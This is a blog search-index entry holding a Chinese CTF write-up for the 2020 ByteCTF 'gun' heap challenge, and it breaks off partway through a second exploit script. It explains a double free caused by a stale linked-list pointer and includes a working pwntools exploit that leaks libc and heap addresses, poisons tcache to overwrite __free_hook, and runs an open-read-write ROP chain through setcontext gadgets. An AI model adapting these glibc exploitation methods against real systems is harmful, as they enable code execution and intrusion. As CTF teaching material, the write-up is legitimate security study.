<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2020ByteCTF-gun</title>
    <link href="/2021/12/31/2020ByteCTF-gun/"/>
    <url>/2021/12/31/2020ByteCTF-gun/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2020年ByteCTF的一道堆题，主要考察libc-2.31.so中的堆利用</p><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><ul><li>使用的是<code>libc-2.31.so</code></li><li>secomp-tools dump .&#x2F;gun ：只能通过ORW获取flag</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000</span>: <span class="hljs-number">0</span>x20 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00000004  A = arch<br><span class="hljs-attribute">0001</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x09 <span class="hljs-number">0</span>xc000003e  if (A != ARCH_X86_64) goto <span class="hljs-number">0011</span><br><span class="hljs-attribute">0002</span>: <span class="hljs-number">0</span>x20 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00000000  A = sys_number<br><span class="hljs-attribute">0003</span>: <span class="hljs-number">0</span>x35 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x01 <span class="hljs-number">0</span>x40000000  if (A &lt; <span class="hljs-number">0</span>x40000000) goto <span class="hljs-number">0005</span><br><span class="hljs-attribute">0004</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x06 <span class="hljs-number">0</span>xffffffff  if (A != <span class="hljs-number">0</span>xffffffff) goto <span class="hljs-number">0011</span><br><span class="hljs-attribute">0005</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x04 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00000000  if (A == read) goto <span class="hljs-number">0010</span><br><span class="hljs-attribute">0006</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x03 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00000001  if (A == write) goto <span class="hljs-number">0010</span><br><span class="hljs-attribute">0007</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x02 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00000002  if (A == open) goto <span class="hljs-number">0010</span><br><span class="hljs-attribute">0008</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x01 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x0000003c  if (A == exit) goto <span class="hljs-number">0010</span><br><span class="hljs-attribute">0009</span>: <span class="hljs-number">0</span>x15 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x01 <span class="hljs-number">0</span>x00000101  if (A != openat) goto <span class="hljs-number">0011</span><br><span class="hljs-attribute">0010</span>: <span class="hljs-number">0</span>x06 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x7fff0000  return <span class="hljs-literal">ALLOW</span><br><span class="hljs-attribute">0011</span>: <span class="hljs-number">0</span>x06 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x00000000  return KILL<br></code></pre></td></tr></table></figure><ul><li>checksec gun ：保护全开</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">RELRO:</span>    Full RELRO<br><span class="hljs-symbol">Stack:</span>    Canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br></code></pre></td></tr></table></figure><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>整个程序主要考察堆利用，由三个功能构成，购买子弹，上膛子弹，射击子弹。</p><ul><li><p>购买子弹首先会根据从小到大寻找一个对应flag为0的idx，然后malloc一个用户指定大小的chunk(0x10~0x500)，且所有堆块的用户区域大小不能超过一定数值。此外该子弹的flag设置为1，同时有一次向chunk写数据的机会，购买的子弹会通过一个18字节大小的数据结构管理。chunk指向分配的堆块，next用于在上膛状态指向下一个子弹，flag是标志位分别有0，1，2，表示不同的状态。只能同时有14个子弹。</p>  <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">struct</span>&#123;<br><span class="hljs-type">char</span>* chunk;<br><span class="hljs-type">char</span>* next;<br><span class="hljs-type">int</span> flag;  <span class="hljs-comment">// 0为发射之后 1为购买状态 2为上膛状态</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>上膛子弹会先检查压入子弹的idx是否小于等于13和对应flag是否是1，然后才把子弹放进弹夹中，如果弹夹中已经有子弹，则会使用next进行链接，next指向上一次压入弹夹中的子弹，然后把这个子弹放进弹夹中，构成一个由子弹组成的单向链表，最后改变子弹标志位为2。</p></li><li><p>发射子弹会先指定射击次数，然后从弹夹中的子弹（单链表表头）开始free，直到达到指定次数，子弹射击结束后会设置相应的flag为0。每次射击之前会输出这个子弹的chunk内容，这给了我们泄露的机会。free时没有检查flag。</p></li><li><p>自定义的输入函数myread：当输入字节数超过约定大小和遇到<code>\n</code>时立即结束输入，并且不会将<code>\n</code>写入指定内存，因此payload中需要避免有<code>\x0a</code>字节，此外我们申请一个chunk之后可以实现不往chunk中写入数据（只发送一个<code>\n</code>）</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sqf">unsigned <span class="hljs-variable">__int64</span> <span class="hljs-variable">__fastcall</span> myread(<span class="hljs-variable">__int64</span> addr, unsigned <span class="hljs-variable">__int64</span> <span class="hljs-built_in">size</span>)<br>&#123;<br>  unsigned <span class="hljs-variable">__int64</span> result; <span class="hljs-comment">// rax</span><br>  unsigned <span class="hljs-variable">__int8</span> buf; <span class="hljs-comment">// [rsp+17h] [rbp-9h] BYREF</span><br>  unsigned <span class="hljs-variable">__int64</span> i; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>LL; ; ++i )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( i &gt;= <span class="hljs-built_in">size</span> )<br>      <span class="hljs-built_in">break</span>;<br>    read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1</span>uLL);<br>    result = buf;<br>    <span class="hljs-keyword">if</span> ( buf == <span class="hljs-string">&#x27;\n&#x27;</span> )<br>      <span class="hljs-built_in">break</span>;<br>    *(<span class="hljs-variable">_BYTE</span> *)(i + addr) = buf;<br>  &#125;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ul><li><p>泄露heap：首先申请两个相同大小堆块，然后依次释放进入tcache中，然后再次申请一个该大小的chunk，只输入一个字节即可，然后在释放它，查看释放时的输出即可。</p></li><li><p>泄露libc：首先申请一个超过tcache大小的chunk，然后释放，再申请一个小chunk，不输入字节，使其<code>fd</code>和<code>bk</code>的数据是<code>main_arena+offset</code>，最后通过释放时输出堆块内容来泄露libc。</p></li><li><p>任意地址写：通过构造<code>Double Free</code>实现任意地址写，就需要存在<code>UAF</code>漏洞，所以我们需要申请2个chunk(A和B)，首先单独释放A，然后再单独释放B，此时我们希望B释放之后再释放A，但是由于flag限制，无法再次上膛A，所以我们无法通过正常途径释放A。考虑到可以连续释放单链表中的堆块，并且chunk管理结构体中的next不会随chunk释放而置零，因此我们可以利用原有的next指针（指向A）再次释放A，从而实现<code>Double Free</code>。</p></li><li><p>获取flag：由沙箱逻辑可知只能通过ORW来获取flag，利用<code>Double Free</code>修改<code>__free_hook</code>为一系列gadget即可。</p></li><li><p>gadget1：libc-2.31.so的setcontext从61处开始，并且由rdx决定而不是rdi，因此需要先找一个gadget（getkeyserv_handle+576，如下）来实现通过rdi控制rdx的值，然后再执行<code>setcontext+61</code>。通过<code>setcontext+61</code>在<code>__free_hook</code>处写入用于ORW的rop链。</p>  <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">8</span>] <span class="hljs-comment">; </span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>], <span class="hljs-built_in">rax</span> <span class="hljs-comment">; </span><br><span class="hljs-keyword">call</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span> + <span class="hljs-number">0x20</span>]<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li><li><p>gadget2：利用<code>svcudp_reply+26</code>这个gadget和<code>leave;ret</code>指令进行栈迁移到堆中，在对上提前布置好ROP链即可。</p></li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">svcudp_reply+<span class="hljs-number">26</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">0x48</span>]<span class="hljs-comment">; </span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + <span class="hljs-number">0x18</span>]<span class="hljs-comment">; </span><br><span class="hljs-keyword">lea</span> <span class="hljs-built_in">r13</span>, [<span class="hljs-built_in">rbp</span> + <span class="hljs-number">0x10</span>]<span class="hljs-comment">; </span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + <span class="hljs-number">0x10</span>], <span class="hljs-number">0</span><span class="hljs-comment">; </span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">r13</span><span class="hljs-comment">; </span><br><span class="hljs-keyword">call</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x28</span>]<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><h3 id="利用setcontext-61写入并执行ROP链"><a href="#利用setcontext-61写入并执行ROP链" class="headerlink" title="利用setcontext+61写入并执行ROP链"></a>利用setcontext+61写入并执行ROP链</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>REMOTE = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> REMOTE:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./gun&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;/home/sh0ve1/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./gun&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shoot</span>(<span class="hljs-params">times</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Action&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Shoot time: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(times).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Action&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Which one do you want to load?&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Action&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Bullet price: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Bullet Name: &quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leave_name</span>(<span class="hljs-params">name</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Your name: &quot;</span>)<br>    p.sendline(name)<br><br><br>leave_name(<span class="hljs-string">&quot;sh0ve1&quot;</span>)<br><br><span class="hljs-comment"># leak libc </span><br>buy(<span class="hljs-number">0x4c0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x4c0</span>) <span class="hljs-comment">#0  0x4d0=0x70*0xb</span><br>buy(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span><br><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>) <span class="hljs-comment"># unsorted bin</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;A&#x27;</span>)<span class="hljs-comment">#0</span><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>)<br><br>libc.address = (u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) &amp; <span class="hljs-number">0xfffffffff000</span>) - <span class="hljs-number">0x1ec000</span> <br>__free_hook = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>setcontext = libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span><br>log.success(<span class="hljs-string">&quot;libcbase :&quot;</span> + <span class="hljs-built_in">hex</span>(libc.address))<br><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#0</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#2</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#3</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#5</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#6</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#7</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#8</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#9</span><br><br>load(<span class="hljs-number">0</span>)<br>load(<span class="hljs-number">2</span>)<br>shoot(<span class="hljs-number">2</span>)<br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;&#x27;</span>) <span class="hljs-comment">#0</span><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&quot;The &quot;</span>)<br>heapbase = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x340</span><br>log.success(<span class="hljs-string">&quot;heapbase: &quot;</span> + <span class="hljs-built_in">hex</span>(heapbase))<br><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#0</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#2 此时idx=2的chunk的next_bullet依旧是idx=0</span><br><br><span class="hljs-comment"># 用idx=3~9的填满tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    load(i+<span class="hljs-number">3</span>)<br>shoot(<span class="hljs-number">7</span>)<br><br><span class="hljs-comment"># 先将idx=0放入fastbin</span><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># load一次，射击两次，利用next_bullet来double free idx=0（连续射击时没有检查flag）</span><br>load(<span class="hljs-number">2</span>)<br>shoot(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># idx=0,2~7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;D&#x27;</span>*<span class="hljs-number">0x60</span>)<br><br>buy(<span class="hljs-number">0x60</span>,p64(__free_hook)) <span class="hljs-comment">#8</span><br><br>str_flag = heapbase + <span class="hljs-number">0x340</span><br>frame_addr = heapbase + <span class="hljs-number">0x7c0</span> <br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rdx, dword ptr [rdi + 8] ; </span><br><span class="hljs-string">mov qword ptr [rsp], rax ; </span><br><span class="hljs-string">call qword ptr [rdx + 0x20];</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># way 1</span><br>gadget = libc.address + <span class="hljs-number">0x154930</span><br>frame = SigreturnFrame()<br>frame[<span class="hljs-string">&#x27;uc_stack.ss_size&#x27;</span>] = setcontext <span class="hljs-comment"># [rdx + 0x20]=[frame_addr + 0x20]</span><br>frame.rip = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] <span class="hljs-comment"># 实际先是rcx</span><br>frame.rdi = <span class="hljs-number">0</span><br>frame.rsi = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>frame.rdx = <span class="hljs-number">0x200</span><br>frame.rsp = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;./flag\x00&#x27;</span>) <span class="hljs-comment">#9 </span><br>buy(<span class="hljs-number">0x100</span>,<span class="hljs-built_in">bytes</span>(frame)) <span class="hljs-comment">#10</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>*<span class="hljs-number">0x60</span>)<span class="hljs-comment">#11</span><br>buy(<span class="hljs-number">0x60</span>,p64(gadget)) <span class="hljs-comment">#12 修改__free_hook为gadget</span><br>payload = p64(<span class="hljs-number">0</span>) + p64(frame_addr) <span class="hljs-comment">#rdx=[rdi+8]</span><br><br>buy(<span class="hljs-number">0x60</span>,payload) <span class="hljs-comment">#13</span><br>rop = ROP(libc)<br>rop.<span class="hljs-built_in">open</span>(str_flag,<span class="hljs-number">0x4</span>)<br>rop.read(<span class="hljs-number">3</span>,str_flag,<span class="hljs-number">0x30</span>)<br>rop.write(<span class="hljs-number">1</span>,str_flag,<span class="hljs-number">0x30</span>)<br><br><span class="hljs-comment"># pwnlib.gdb.attach(p,&quot;b *0x7ffff7f2a930&quot;)  #0x7ffff7f2a930 0x7ffff7e2e0dd</span><br>load(<span class="hljs-number">13</span>) <span class="hljs-comment"># trriger</span><br>shoot(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># pause()</span><br>p.sendline(rop.chain())<br><br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure><h3 id="利用svcudp-reply-26和leave-ret进行栈迁移"><a href="#利用svcudp-reply-26和leave-ret进行栈迁移" class="headerlink" title="利用svcudp_reply+26和leave;ret进行栈迁移"></a>利用svcudp_reply+26和leave;ret进行栈迁移</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>REMOTE = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> REMOTE:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./gun&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;/home/sh0ve1/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./gun&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title 